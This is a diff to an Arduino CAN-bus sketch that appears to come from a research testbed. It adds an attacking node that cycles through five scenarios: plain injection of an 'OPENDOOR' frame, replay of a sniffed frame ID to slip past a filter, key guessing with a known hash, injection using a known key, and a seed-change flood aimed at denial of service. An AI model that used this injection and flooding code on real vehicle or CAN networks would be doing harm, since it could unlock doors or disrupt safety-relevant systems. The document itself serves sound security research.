@@ -11,6 +11,7 @@
 #define CAN0_INT 2
 #define AVR_UNO_CS 10
 #define _OPENDOOR "OPENDOOR"
+#define _CHANGE_SEED "chanSEED"
 
 // CAN network interface variables
 MCP_CAN CAN0(AVR_UNO_CS);
@@ -19,60 +20,28 @@ unsigned char len = 0;
 unsigned char rxBuf[8];
 
 long unsigned int encryptedFrame = 0;
+unsigned char initialKey[17] = "Initial Keysssss";
+unsigned char mockKey[17] = "";
 
 static unsigned int iteration = 0;
 
 // Attcking node scenarios: 
-// 1. Nothing about the network and how encryption works is known
+// 1. Nothing about the network and how encryption works is known, aka a classic CAN injection
 //    a. Listen to the messages
 //    b. Send the "OPENDOOR" message
 // 2. We will listen for the encrypted frame and send the messages so we will bypass the filter.
 //    a. Listen to the messages and record the encryptedFrame
 //    b. Send the "OPENDOOR" message
-// 3. We start from 2 and add the fact that we know the hashing funtion, but not the initialKey
+// 3. We start from 2 and add the fact that we know the hashing function, but not the initialKey
 // 4. We go from 3 and we know the initialKey
 // 5. A more sophisticated attack, we will start from the fact that the only frame that the network will accept 
 // without encryption is the _CHANGE_SEED frame. We will basically DOS the network and force a timeout.
 
-// Function to show "unsigned char" text
-// The function acepts the following arguments:
-// msg: pointer to the message to be displayed.
-// standard: boolean that states the operation mode of the function
-// true -> We do not know how many chars are in the msg and we want to print everything
-// false -> print the first 16 chars
-void showMessage1(unsigned char* msg, bool standard)
+// Function to guess the initialKey
+void guessKey(unsigned char* key)
 {
-    unsigned char i = 0;
-
-    if (!standard)
-    {
-        for (i = 0; i < 16; i++)
-        {
-            Serial.print(" ");
-            Serial.print(msg[i], HEX);
-        }
-    }
-    else
-        while (msg[i] != NULL && msg[i] != '\0' && msg[i] != 204)
-        {
-            Serial.print(" ");
-            Serial.print(msg[i], HEX);
-            i++;
-        }
-    Serial.println();
-}
-
-// Function to copy 8 bytes of "unsigned char" text
-// The function acepts the following arguments:
-// destination: pointer to the destination string.
-// source: pointer to the source string.
-// start: the value of the element in the string that we are starting to copy
-void copyByteString(unsigned char* destination, unsigned char* source, unsigned char start)
-{
-  unsigned char i = 0;
-  
-  for(i = start; i < 8 + start; i++)
-    destination[i] = source[i - start];
+  for(int i = 0; i < 16; i++)
+    key[i] = (unsigned char)random(1, 255);
 }
 
 void setup() 
@@ -81,13 +50,17 @@ void setup()
   
   // Initialize MCP2515 running at 16MHz with a baudrate of 500kb/s and the masks and filters disabled.
   if(CAN0.begin(MCP_ANY, CAN_500KBPS, MCP_16MHZ) == CAN_OK)
-    Serial.println("MCP2515 Initialized Successfully!");
+    Serial.println(F("MCP2515 Initialized Successfully!"));
   else
-    Serial.println("Error Initializing MCP2515...");
+    Serial.println(F("Error Initializing MCP2515..."));
   
   CAN0.setMode(MCP_NORMAL);                     // Set operation mode to normal so the MCP2515 sends acks to received data.
 
   pinMode(CAN0_INT, INPUT);  
+
+  Serial.println(F("Going to sleep....."));
+
+  delay(30000);
 
 }
 
@@ -97,23 +70,49 @@ void loop()
   
   if(iteration <= 20)
   {
-    // first attack  
+    readCAN(0);
+
+    writeCAN(0x100, _OPENDOOR, 8); // classic CAN injection, we are sending a standard frame due to it's higher priority, but it should get filtered by the network
+
+    Serial.println(F("Classic CAN injection executed."));
   }
   else if(iteration <= 40)
   {
-    // second attack  
+    readCAN(1);
+
+    writeCAN(encryptedFrame, _OPENDOOR, 8); // advanced CAN injection, bypass the frame filter
+
+    Serial.println(F("Advanced CAN injection executed.")); 
   }
   else if(iteration <= 60)
   {
-    // third attack  
+    readCAN(1);
+
+    guessKey(mockKey);
+
+    bad_hash(mockKey, random(1, 200));
+
+    writeCAN(encryptedFrame, _OPENDOOR, 8); // implausable CAN injection, we know that the hashing function is deterministic and we know the function too
+
+    Serial.println(F("Implausable CAN injection executed.")); 
   }
   else if(iteration <= 80)
   {
-    // fourth  attack
+    readCAN(1);
+
+    bad_hash(initialKey, random(1, 200));
+
+    writeCAN(encryptedFrame, _OPENDOOR, 8); // implausable CAN injection, we know that the hashing function is deterministic and we know the function too
+
+    Serial.println(F("Implausable CAN injection executed, we know the key and the hash function.")); 
   }
   else if(iteration <= 100)
   {
-    // fifth attack  
+    readCAN(1);
+    
+    writeCAN(encryptedFrame, _CHANGE_SEED, 8); // implausable CAN injection, we know that the hashing function is deterministic and we know the function too
+
+    Serial.println(F("DOS the netwrok.")); 
   }
   else
     iteration = 0;
@@ -139,22 +138,18 @@ void writeCAN(long id, unsigned char* data, unsigned char leng)
   {
     Serial.println("Error Sending Message...");
   }
-  delay(100);   // send data per 100ms
+  delay(20);   // send data per 100ms
   
 }
 
 // Function to read a CAN message
 // the function also handles the processing of the frame
-void readCAN()
+void readCAN(int mode)
 {
   if(!digitalRead(CAN0_INT))                         // If CAN0_INT pin is low, read receive buffer
   { 
     CAN0.readMsgBuf(&rxId, &len, rxBuf);      // Read data: len = data length, buf = data byte(s)
 
-    if((rxId & encryptedFrame) == encryptedFrame) // filter any frame that comes
-    {
-//      burst++;
-      
       if((rxId & 0x80000000) == 0x80000000)     // Determine if ID is standard (11 bits) or extended (29 bits)
        {
         Serial.println("Extended ID: 0x");
@@ -183,8 +178,6 @@ void readCAN()
           Serial.print(rxBuf[i], HEX);
         }
       }
-
-      ProcessCANInput(len, rxBuf, rxId);
       
       Serial.println();
     }
@@ -192,86 +185,10 @@ void readCAN()
     {
       // do nothing
     }
-  }
-  else
-  {
-      // do nothing  
-  }
-  
-}
 
-// Function to process a CAN frame
-// The function accepts the following arguments:
-// packetSize: the size of the current payload
-// message: the current payload
-// id: the current id of the frame
-inline void ProcessCANInput(int packetSize, unsigned char* message, long id)
-{
-//  if((packetSize == 8 && burst != 0) && (isBobSent && isAliceRecevied))
-//  {
-//      switch(burst)
-//      {
-//        case 1:
-//            copyByteString(encryptedMessage, message, 0);
-//            showMessage1(encryptedMessage, true);
-//
-//            failsafe = 0;
-//            break;
-//  
-//        case 2:
-//             failsafe = 0;
-//             burst = 0;
-//             
-//             copyByteString(encryptedMessage, message, 8);
-//             showMessage1(encryptedMessage, true);
-//             break;
-//             
-//        default:
-//              Serial.println("How did u get in here? Check burst conditions ASAP!!!");
-//              break;
-//        
-//       }
-//  }
-//  else if(checkSEED(message))
-//  {
-//    encryptedFrame = id;
-//    changeSeedRequest();
-//    
-//    Serial.println("SEED changed");
-//
-//    burst = 0;
-//
-//  }
-//  else if((packetSize == 8 && isBobSent) && !isAliceRecevied)
-//  {
-//    Point alice_pub;
-//    
-//    Serial.println("Recevied Alice, calculating...");
-//
-//    alice_pub.x = (int)message[3];
-//    alice_pub.y = (int)message[7];
-//    
-//    bob_shared = scalar_mult(bob_secret, alice_pub);
-//
-//    Serial.print("Alice.x = ");
-//    Serial.println(alice_pub.x);
-//    Serial.print("Alice.y = ");
-//    Serial.println(alice_pub.y);
-//
-//    Serial.println("Bob_shared calculated");
-//    
-//    Serial.print("Bob_shared.x = ");
-//    Serial.println(bob_shared.x);
-//    Serial.print("Bob_shared.y = ");
-//    Serial.println(bob_shared.y);
-//    
-//    burst = 0;
-//    failsafe = 0;
-//
-//    isAliceRecevied = true;
-//  }
-//  else 
-//  {
-//    // better performance, no statement stands in the air.
-//  }
+    if(mode == 1)
+    {
+      encryptedFrame = rxId;
+    }
+    
 }
